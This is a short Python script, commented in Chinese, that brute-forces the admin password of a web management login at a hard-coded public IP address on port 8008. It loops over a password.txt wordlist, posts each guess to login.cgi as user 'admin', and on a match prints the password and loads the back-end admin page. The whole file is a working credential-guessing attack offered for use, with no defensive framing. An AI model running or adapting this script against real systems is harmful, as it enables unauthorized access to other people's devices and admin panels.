# 登录网站
# http://112.64.220.234:8008/login.html
# 登录成功
# http://112.64.220.234:8008/index.htm?_1725094780
# api
# http://112.64.220.234:8008/login.cgi
import requests

url = "http://112.64.220.234:8008/login.html"
url1 = "http://112.64.220.234:8008/login.cgi"
url2 = "http://112.64.220.234:8008/index.htm?_1725094780"

headers = {
    "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:129.0)Gecko/20100101Firefox/129.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,"
              "*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip,deflate",
    "Referer": "http://112.64.220.234:8008/login.html",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "69",
    "Origin": "http://112.64.220.234:8008",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0,i",
}

# 创建会话
session = requests.Session()

# 判断回显
result = session.get(url=url, timeout=5, verify=False)
# print(result.status_code)

with open("password.txt", 'r') as f:
    for i in f.readlines():
        passwd = i.strip()
        data = f"user=admin&password={passwd}"
        # print(i.strip())
        if result.status_code == 200:
            try:
                res1 = session.post(url=url1, headers=headers, data=data, timeout=5, verify=False)
                res1.raise_for_status()  # 检查请求是否成功
                res1_text = res1.content.decode('utf-8', errors='ignore')  # 处理乱码

                if "index.htm" in res1_text:
                    print("登录成功！密码为：" + passwd)
                    ression2 = session.get(url=url2, timeout=5)
                    print(ression2.text)
                    if "http://www.w3.org/1999/xhtml" in ression2.text:
                        print("登录成功,欢迎来到后台管理系统")
                    break  # 登录成功后退出循环
                else:
                    print("登录失败，密码为：" + passwd)
            except requests.exceptions.RequestException as e:
                print(f"Request error: {e}")


